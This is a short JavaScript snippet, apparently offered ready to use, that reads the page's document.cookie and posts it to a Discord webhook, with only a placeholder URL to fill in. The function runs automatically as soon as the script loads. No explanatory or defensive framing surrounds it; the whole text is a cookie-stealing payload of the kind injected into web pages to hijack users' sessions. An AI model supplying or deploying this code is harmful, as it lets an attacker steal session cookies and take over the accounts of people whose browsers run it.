javascript

// Replace with your Discord webhook URL

const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';



function sendCookieToDiscord() {

    const cookie = document.cookie;

    const data = {

        content: `New cookie logged: ${cookie}`

    };



    fetch(webhookUrl, {

        method: 'POST',

        headers: {

            'Content-Type': 'application/json'

        },

        body: JSON.stringify(data)

    }).then(response => {

        if (response.ok) {

            console.log('Cookie sent to Discord!');

        } else {

            console.error('Failed to send cookie to Discord.');

        }

    }).catch(error => {

        console.error('Error:', error);

    });

}



// Call the function to send the cookie

sendCookieToDiscord();